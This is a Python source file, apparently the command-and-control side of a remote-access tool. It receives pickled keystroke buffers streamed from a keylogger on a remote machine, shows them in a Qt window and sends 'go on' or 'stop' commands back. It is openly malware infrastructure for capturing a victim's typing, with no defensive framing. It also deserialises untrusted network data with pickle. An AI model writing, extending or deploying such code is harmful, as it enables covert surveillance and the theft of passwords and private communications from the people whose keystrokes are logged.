import struct
import pickle
import struct
import asyncio
from window import*
from qasync import QEventLoop 

async def receive_keylogger_stream(GUI,win_manager):
    try:
        # 如果窗口没有打开，则重新打开
        if win_manager.keylogger_window is None or not win_manager.keylogger_window.isVisible():
            win_manager.open_keylogger_window()
         # 启动 Tkinter 窗口的事件循环
        async def start_gui():
            loop = QEventLoop(win_manager.root)  # 使用 qasync 事件循环
            asyncio.set_event_loop(loop)  # 设置当前事件循环
            loop.run_forever()
        # 使用 asyncio 创建任务来运行 Tkinter 的主事件循环
        gui_task = asyncio.create_task(start_gui())
        while True:
            try:
                flag = await asyncio.wait_for(GUI.connections["keylogger"]["reader"].read(1), timeout=1.0)
            except asyncio.TimeoutError:
                flag = b'\3'  # 如果超时，设置flag为b'\3'
            if(flag == b'\1'):
                # 读取数据大小（一个32位的无符号长整型）
                size_data = await GUI.connections["keylogger"]["reader"].read(struct.calcsize('L'))
                if not size_data:
                    GUI.append_log("[!] No data received. Connection closed.")
                    break

                size = struct.unpack('L', size_data)[0]
                data = b''  # 用于存储完整的数据
                while len(data) < size:
                    more_data = await GUI.connections["keylogger"]["reader"].read(size - len(data))
                    if not more_data:
                        raise Exception("[!] Data was truncated or connection was closed.")
                    data += more_data

                key_buffer = pickle.loads(data)


                # 更新窗口显示键盘记录数据
                if win_manager.keylogger_window:
                    win_manager.keylogger_window.update_display(key_buffer)

            if GUI.keylogger_check == False:
                operation = "stop"
                GUI.connections["keylogger"]["writer"].write(operation.encode())
                await GUI.connections["keylogger"]["writer"].drain()
                break
            else:
                operation = "go on"
                GUI.connections["keylogger"]["writer"].write(operation.encode())
                await GUI.connections["keylogger"]["writer"].drain()

    except Exception as e:
        GUI.append_log(f"[!] Error during receiving keylogger stream: {e}")
        win_manager.close_keylogger_window()
    finally:
        win_manager.close_keylogger_window()
        # 取消 GUI 任务
        gui_task.cancel()  # 取消 GUI 事件循环任务
        try:
            await gui_task  # 等待任务取消完成
        except asyncio.CancelledError:
            pass  # 忽略任务取消时的异常